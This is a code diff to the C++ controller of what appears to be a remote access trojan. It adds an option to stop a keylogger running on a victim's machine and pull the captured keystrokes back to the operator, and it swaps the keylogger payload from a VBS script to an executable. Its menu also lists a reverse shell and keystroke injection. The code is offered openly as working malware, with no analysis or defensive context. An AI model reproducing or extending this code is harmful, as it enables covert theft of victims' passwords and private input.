@@ -7,6 +7,7 @@
 #include <thread>
 #include <sstream>
 #include <mutex>
+#include <fstream>
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
@@ -51,7 +52,6 @@ int main(int argc, char *argv[])
             {   
                 socket_setup(sock);
                 send_data(sock,"from_server.txt","`");
-
 
                 string connected_target = receive_data(sock,"target_name.rat");
 
@@ -120,8 +120,46 @@ int main(int argc, char *argv[])
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server.txt", "5keylogger.vbs");
+                    send_data(sock,"from_server.txt", "5keylogger.exe");
                     cout << ">> Sent " << endl;
+                }
+                else cout << ">> Target not connected or socket invalid!!" << endl;
+                system("pause");
+
+                break;
+            }
+
+            case '6':                                                                   //stop keylogger
+            {
+                if (targetconnected)
+                {
+                    std::ofstream outputFile("keystrokes.txt", std::ios::app);
+
+                    send_data(sock,"key_strokes.txt", "`");
+                    send_data(sock,"klogger_cmd.txt", "s");
+                    cout << ">> Sent stop" << endl;
+                    
+                    string temp;
+                    
+                    bool wait = true;
+                    while(wait)
+                    {
+
+                        temp = receive_data(sock,"key_strokes.txt");
+                        
+                        if(temp[0] == '`')
+                        {
+                            Sleep(500);
+                            continue;
+                        }
+                        else wait = false;
+                    }
+                    
+                    outputFile << temp;
+                    outputFile.close();
+
+                    cout << ">> !! Keylogger stopped and [key_strokes.txt] Generated " << endl;
+                    system("pause");
                 }
                 else cout << ">> Target not connected or socket invalid!!" << endl;
                 system("pause");
@@ -535,6 +573,7 @@ char Get_menu_option()
                                     Rev Shell                               3
                                     KeyStroke Injection                     4
                                     Run KeyLogger                           5
+                                    Get Keystrokes                          6
                                                                             )";            
                                     
     if(targetconnected)cout << R"(
